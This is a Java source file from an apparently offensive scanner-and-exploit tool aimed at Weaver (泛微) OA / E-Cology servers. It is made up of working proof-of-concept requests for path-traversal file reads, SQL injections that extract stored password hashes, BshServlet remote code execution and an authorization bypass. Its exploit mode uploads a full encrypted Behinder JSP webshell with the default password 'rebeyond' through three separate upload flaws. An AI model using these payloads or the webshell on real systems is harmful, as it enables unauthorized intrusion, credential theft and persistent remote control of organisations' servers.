package com.achuna33.Controllers;

import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.Utils.Cache;
import com.achuna33.Utils.HttpRequest;
import com.achuna33.Utils.Response;
import com.achuna33.Utils.Utils;
import sun.security.krb5.internal.crypto.Des;

import java.net.MalformedURLException;

@BasicMapping(uri ="泛微OA")
public class WeaverController  extends Controller implements BasicController{
    public static String[] SupportVul; //初始化支持的漏洞
    public static String name = "泛微";
    public WeaverController(){

    }
    @VulnerabilityDescriptionMapping(Description="泛微OA ln.FileDownload 任意文件读取漏洞" ,SupportVulType= com.achuna33.SupportType.SupportVul.信息泄露)
    public void vul_ln_FileDownload(Poc_Exp type, String target, Object... args) throws MalformedURLException {

        WriteLog("\n[*]开始检测：  泛微OA ln.FileDownload 任意文件读取漏洞");

        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml");
                String data = "";
                Response result = httpRequest.Get(data);
                if(result.statusCode==200 && result.responseBody.contains("pattern")){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n 访问地址："+target+"/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml" );
                }else {
                    WriteLog("\n 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }
    @VulnerabilityDescriptionMapping(Description = "泛微OA getdata.jsp SQL注入漏洞",SupportVulType = com.achuna33.SupportType.SupportVul.SQLInjection)
    public void vul_getdataSqlInjection(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  泛微OA getdata.jsp SQL注入漏洞");
        String url = "/js/hrm/getdata.jsp";
        switch (type){
            case EXP:
                break;
            case POC:
                String targetUrl = target+url+"?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager";
                HttpRequest httpRequest = new HttpRequest(targetUrl);
                String data = "";
                Response result = httpRequest.Get(data);
                if(result.statusCode==200 ){
                    WriteLog("\n 存在漏洞");
                    WriteLog("\n 访问地址："+targetUrl );
                }else {
                    WriteLog("\n 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }

@VulnerabilityDescriptionMapping(Description = "泛微OA uploadOperation.jsp 任意文件上传",SupportVulType = com.achuna33.SupportType.SupportVul.UploadFile)
public void vul_uploadOperation(Poc_Exp type, String target, Object... args) throws MalformedURLException {
    WriteLog("\n[*]开始检测：  泛微OA uploadOperation.jsp 任意文件上传");
    String url = "/page/exportImport/uploadOperation.jsp";
    String data = "------WebKitFormBoundary6XgyjB6SeCArD3Hc\r\n" +
            "Content-Disposition: form-data; name=\"file\"; filename=\"test.jsp\"\r\n" +
            "Content-Type: application/octet-stream\r\n" +
            "\r\n" +
            "Shellcode\r\n" +
            "------WebKitFormBoundary6XgyjB6SeCArD3Hc--\r\n";
    switch (type){
        case EXP:
            String path = null;
            String mypayload = null;
            try {
                path = (String) args[0];
                try {
                    byte[] bytes = Utils.readFile(path);
                    mypayload = new String(bytes);
                }catch (Exception e){
                    WriteExpLog("\n [*] 文件读取失败");
                }
            }catch (Exception e){

            }
            String payload = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n";

            if (mypayload!=null){
                payload = mypayload;
            }else {
                WriteExpLog("\n [*] 默认shell 为冰蝎shell 密码 rebeyond");
            }
            String shellpath = Utils.getRandomString(4)+".jsp";
            HttpRequest httpRequest3 = new HttpRequest(target+url);
            httpRequest3.addHeaders("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc");
            httpRequest3.addHeaders("x-forwarded-for","127.0.0.1");
            data = data.replace("Shellcode",payload);
            data = data.replace("test.jsp",shellpath);

            httpRequest3.Post(data);

            Response result1 = new HttpRequest(target +"/page/exportImport/fileTransfer/"+shellpath).Get("");
            if(result1.statusCode==200){
                WriteExpLog("\n[*] shell path:\n"+target +"/page/exportImport/fileTransfer/"+shellpath);
            }else {
                WriteExpLog("\n 访问失败:\n"+target +"/page/exportImport/fileTransfer/"+shellpath);
                WriteExpLog("\n 请验证POC 可靠性 或 EXP免杀性");

            }
            break;
        case POC:
            String targetUrl = target+url;
            String random = Utils.getRandomString(4)+".jsp";
            HttpRequest httpRequest = new HttpRequest(targetUrl);
            httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc");
            httpRequest.addHeaders("x-forwarded-for","127.0.0.1");
            data = data.replace("Shellcode","helloword");
            data = data.replace("test.jsp",random);
            httpRequest.Post(data);
            Response result = new HttpRequest(target+"/page/exportImport/fileTransfer/"+random).Get("");
            if(result.statusCode==200 && result.responseBody.contains("helloword")){
                WriteLog("\n 存在漏洞");
                WriteLog("\n 写入地址："+target+"/page/exportImport/fileTransfer/"+random );
            }else {
                WriteLog("\n 不存在漏洞");
            }
    }
}

@VulnerabilityDescriptionMapping(Description = "泛微OA E-Cology LoginSSO.jsp SQL注入漏洞 CNVD-2021-33202",SupportVulType = com.achuna33.SupportType.SupportVul.SQLInjection)
    public void vul_LoginSSOSqlInjection(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  泛微OA E-Cology LoginSSO.jsp SQL注入漏洞 CNVD-2021-33202");
    String url = "/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager";
    switch (type){
        case EXP:
            break;
        case POC:
            HttpRequest httpRequest = new HttpRequest(target+url);
            String data = "";
            Response result = httpRequest.Get(data);
            if(result.statusCode==200 ){
                WriteLog("\n 存在漏洞");
                WriteLog("\n 访问地址："+target+url );
            }else {
                WriteLog("\n 不存在漏洞");
            }
            //WriteLog("\n"+result.responseBody);
    }
}
@VulnerabilityDescriptionMapping(Description = "泛微OA E-Cology BshServlet 远程代码执行漏洞 CNVD-2019-32204",SupportVulType = com.achuna33.SupportType.SupportVul.RuntimeExec)
    public void vul_BshServlet(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  泛微OA E-Cology BshServlet 远程代码执行漏洞 CNVD-2019-32204");
        String url = "/weaver/bsh.servlet.BshServlet/";
    switch (type){
        case EXP:
            break;
        case POC:
            HttpRequest httpRequest = new HttpRequest(target+url);
            String data = "";
            Response result = httpRequest.Get(data);
            if(result.statusCode==200 ){
                WriteLog("\n 存在漏洞");
                WriteLog("\n 访问地址："+target+url );
            }else {
                WriteLog("\n 不存在漏洞");
            }
            //WriteLog("\n"+result.responseBody);
    }
}
@VulnerabilityDescriptionMapping(Description = "泛微OA E-Cology users.data 敏感信息泄漏",SupportVulType = com.achuna33.SupportType.SupportVul.信息泄露)
    public void vul_UserData(Poc_Exp type, String target, Object... args) throws MalformedURLException {
    WriteLog("\n[*]开始检测：  泛微OA E-Cology users.data 敏感信息泄漏");

    String url = "/messager/users.data";
    switch (type){
        case EXP:
            break;
        case POC:
            HttpRequest httpRequest = new HttpRequest(target+url);
            String data = "";
            Response result = httpRequest.Get(data);
            if(result.statusCode==200 ){
                WriteLog("\n 存在漏洞");
                WriteLog("\n 访问地址："+target+url );
            }else {
                WriteLog("\n 不存在漏洞");
            }
            //WriteLog("\n"+result.responseBody);
    }
}

@VulnerabilityDescriptionMapping(Description = "泛微OA E-Cology HrmCareerApplyPerView.jsp SQL 注入",SupportVulType = com.achuna33.SupportType.SupportVul.SQLInjection)
    public void vul_HrmCareerApplyPerView(Poc_Exp type, String target, Object... args) throws MalformedURLException {
    WriteLog("\n[*]开始检测：  泛微OA E-Cology HrmCareerApplyPerView.jsp SQL 注入");

    String url = "/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7";
    switch (type){
        case EXP:
            break;
        case POC:
            HttpRequest httpRequest = new HttpRequest(target+url);
            String data = "";
            Response result = httpRequest.Get(data);
            if(result.statusCode==200 && result.responseBody.contains("<tr class=")){
                WriteLog("\n 存在漏洞");
                WriteLog("\n 访问地址："+target+url );
            }else {
                WriteLog("\n 不存在漏洞");
            }
            //WriteLog("\n"+result.responseBody);
    }

}

@VulnerabilityDescriptionMapping(Description = "泛微OA WorkflowServiceXml xml 注入漏洞",SupportVulType = com.achuna33.SupportType.SupportVul.RuntimeExec)
public void vul_WorkflowServiceXml(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        String payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"webservices.services.weaver.com.cn\">\n" +
                "   <soapenv:Header/>\n" +
                "   <soapenv:Body>\n" +
                "      <web:doCreateWorkflowRequest>\n" +
                "    <web:string></web:string>\n" +
                "        <web:string>2</web:string>\n" +
                "      </web:doCreateWorkflowRequest>\n" +
                "   </soapenv:Body>\n" +
                "</soapenv:Envelope>";
    WriteLog("\n[*]开始检测：  泛微OA WorkflowServiceXml xml 注入漏洞");

    String url = "/services%20/WorkflowServiceXml";
    switch (type){
        case EXP:
            break;
        case POC:
            HttpRequest httpRequest = new HttpRequest(target+url);
            httpRequest.addHeaders("Content-Type","text/xml;charset=UTF-8");
            Response result = httpRequest.Post(payload);
            if(result.statusCode==200 && result.responseBody.contains("soap:Body")){
                WriteLog("\n[*] 存在漏洞");
                WriteLog("\n[*] 访问地址："+target+url );
                WriteLog("\n[*] 访问相关链接：https://www.anquanke.com/post/id/239865");

            }else {
                WriteLog("\n 不存在漏洞");
            }
            //WriteLog("\n"+result.responseBody);
    }
}

    @VulnerabilityDescriptionMapping(Description = "泛微OA sysinterface codeEdit.jsp 任意文件上传漏洞",SupportVulType = com.achuna33.SupportType.SupportVul.UploadFile)
    public void vul_codeEdit(Poc_Exp type, String target, Object... args) throws MalformedURLException {

        WriteLog("\n[*]开始检测：  泛微OA sysinterface codeEdit.jsp 任意文件上传漏洞");

        String url = "/sysinterface/codeEdit.jsp";
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","text/xml;charset=UTF-8");
                Response result = httpRequest.Get("");
                if(result.statusCode==200 && result.responseBody.contains("import")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问地址："+target+url );
                    WriteLog("\n[*] 访问相关链接：https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA%20sysinterfacecodeEdit.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md");

                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }

    @VulnerabilityDescriptionMapping(Description = "泛微OA WorkflowCenterTreeData SQL注入漏洞 ",SupportVulType = com.achuna33.SupportType.SupportVul.SQLInjection)
    public void vul_WorkflowCenterTreeData(Poc_Exp type, String target, Object... args) throws MalformedURLException {

        WriteLog("\n[*]开始检测：  泛微OA WorkflowCenterTreeData SQL注入漏洞 ");

        String url = "/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333";
        String data = "formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1";
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","text/xml;charset=UTF-8");
                Response result = httpRequest.Post(data);
                if(result.statusCode==200 && result.responseBody.contains("\"id\"")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问地址："+target+url );

                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }
    @VulnerabilityDescriptionMapping(Description = "泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞",SupportVulType = com.achuna33.SupportType.SupportVul.信息泄露)
    public void vul_SignatureDownLoad(Poc_Exp type, String target, Object... args) throws MalformedURLException {

        WriteLog("\n[*]开始检测：  泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞 ");

        String url = "/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27";
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Get("");
                if(result.statusCode==200 && result.responseBody.contains("ecology")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问地址："+target+url );

                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }
    @VulnerabilityDescriptionMapping(Description = "泛微OA E-cology KtreeUploadAction 任意文件上传",SupportVulType = com.achuna33.SupportType.SupportVul.UploadFile)
    public void vul_KtreeUploadAction(Poc_Exp type, String target, Object... args) throws MalformedURLException {

        WriteLog("\n[*]开始检测：  泛微OA E-cology KtreeUploadAction 任意文件上传");

        String url = "/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image";
        String payload = "----------1638451160\r\n" +
                "Content-Disposition: form-data; name=\"test\"; filename=\"test.jsp\"\r\n" +
                "Content-Type: image/jpeg\r\n" +
                "\r\n" +
                "helloword\r\n" +
                "----------1638451160--";
        switch (type){
            case EXP:
                String path = null;
                String mypayload = null;
                try {
                    path = (String) args[0];
                    try {
                        byte[] bytes = Utils.readFile(path);
                        mypayload = new String(bytes);
                    }catch (Exception e){
                        WriteExpLog("\n [*] 文件读取失败");
                    }
                }catch (Exception e){

                }
                String EXP = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n";

                if (mypayload!=null){
                    EXP = mypayload;
                }else {
                    WriteExpLog("\n [*] 默认shell 为冰蝎shell 密码 rebeyond");
                }
                payload = payload.replace("helloword",EXP);
                HttpRequest ExploitRequest = new HttpRequest(target+url);
                ExploitRequest.addHeaders("Cookie","Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test");
                ExploitRequest.addHeaders("Content-Type","multipart/form-data; boundary=----1638451160");

                Response exp_result = ExploitRequest.Post(payload);
                if(exp_result.statusCode==200 && exp_result.responseBody.length()>0){
                    WriteExpLog("\n[*] 上传地址地址："+exp_result.responseBody );
                }else {
                    WriteExpLog("\n[*] 利用异常");
                }
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Cookie","Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test");
                httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=----1638451160");

                Response result = httpRequest.Post(payload);

                if(result.statusCode==200 && result.responseBody.length()>0){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问地址："+target+url );

                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
                //WriteLog("\n"+result.responseBody);
        }
    }

    @VulnerabilityDescriptionMapping(Description = "泛微OA weaver.common.Ctrl 任意文件上传漏洞",SupportVulType = com.achuna33.SupportType.SupportVul.UploadFile)
    public void vul_weaver_common_Ctrl(Poc_Exp type, String target, Object... args) throws MalformedURLException {

        WriteLog("\n[*]开始检测：  泛微OA weaver.common.Ctrl 任意文件上传漏洞");

        String url = "/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp";
        String payload = "----------1638451160\r\n" +
                "Content-Disposition: form-data; name=\"test\"; filename=\"test.zip\"\r\n" +
                "Content-Type: image/jpeg\r\n" +
                "\r\n" +
                "helloword\r\n" +
                "----------1638451160--";
        switch (type){
            case EXP:
//                String path = null;
//                String mypayload = null;
//                try {
//                    path = (String) args[0];
//                    try {
//                        byte[] bytes = Utils.readFile(path);
//                        mypayload = new String(bytes);
//                    }catch (Exception e){
//                        WriteExpLog("\n [*] 文件读取失败");
//                    }
//                }catch (Exception e){
//
//                }
//                String EXP = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n";
//
//                if (mypayload!=null){
//                    EXP = mypayload;
//                }else {
//                    WriteExpLog("\n [*] 默认shell 为冰蝎shell 密码 rebeyond");
//                }
//                payload = payload.replace("helloword",EXP);
//                HttpRequest ExploitRequest = new HttpRequest(target+url);
//                ExploitRequest.addHeaders("Cookie","Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test");
//                ExploitRequest.addHeaders("Content-Type","multipart/form-data; boundary=----1638451160");
//
//                Response exp_result = ExploitRequest.Post(payload);
//                if(exp_result.statusCode==200 && exp_result.responseBody.length()>0){
//                    WriteExpLog("\n[*] 上传地址地址："+exp_result.responseBody );
//                }else {
//                    WriteExpLog("\n[*] 利用异常");
//                }
                WriteExpLog("\n[*] 抱歉,没有为您提供 EXP");
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Cookie","Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test");
                Response result = httpRequest.Get("");

                if(result.statusCode==200){
                    WriteLog("\n[*] 访问返回状态码为200 .css可能出现了权限绕过，请手动测试。");
                    WriteLog("\n[*] 访问地址："+target+url );

                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

@VulnerabilityDescriptionMapping(Description = "泛微OA uploadFileClient.jsp 任意文件上传漏洞",SupportVulType = com.achuna33.SupportType.SupportVul.UploadFile)
    public void vul_uploadFileClient(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  泛微OA vul_uploadFileClient 任意文件上传漏洞");

    String url = "/clusterupgrade/uploadFileClient.jsp";
    String randomStr = Utils.getRandomString(4);
    String payload = "----------1638451160\r\n" +
            "Content-Disposition: form-data; name=\"upload\"; filename=\"../../clusterupgrade/"+randomStr+".jsp\"\r\n" +
            "Content-Type: image/jpeg\r\n" +
            "\r\n" +
            "payload\r\n" +
            "----------1638451160--";
    switch (type){
        case EXP:
            String path = null;
            String mypayload = null;
            try {
                path = (String) args[0];
                try {
                    byte[] bytes = Utils.readFile(path);
                    mypayload = new String(bytes);
                }catch (Exception e){
                    WriteExpLog("\n [*] 文件读取失败");
                }
            }catch (Exception e){

            }
            String EXP = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\n";

            if (mypayload!=null){
                EXP = mypayload;
            }else {
                WriteExpLog("\n [*] 默认shell 为冰蝎shell 密码 rebeyond");
            }
            payload = payload.replace("payload",EXP);
            HttpRequest ExploitRequest = new HttpRequest(target+url);
            ExploitRequest.addHeaders("Content-Type","multipart/form-data; boundary=----1638451160");

            Response exp_result = ExploitRequest.Post(payload);
            if(exp_result.statusCode==200 && exp_result.responseBody.length()>0){
                WriteExpLog("\n[*] 上传地址地址："+target+"/clusterupgrade/"+randomStr+".jsp" );
            }else {
                WriteExpLog("\n[*] 利用异常 请手动访问"+target+"/clusterupgrade/"+randomStr+".jsp");
            }
            break;
        case POC:
            payload = payload.replace("payload","<%out.print(\"test\");%>");
            HttpRequest httpRequest = new HttpRequest(target+url);
            httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=----1638451160");

            httpRequest.Post(payload);

            Response result = new HttpRequest(target+"/clusterupgrade/"+randomStr+".jsp").Get("");


            if(result.statusCode==200 && result.responseBody.length()>0){

                WriteLog("\n[*] 存在漏洞");
                WriteLog("\n[*] 访问地址："+target+"/clusterupgrade/"+randomStr+".jsp" );

            }else {
                WriteLog("\n[*] 不存在漏洞");
            }
}

}}
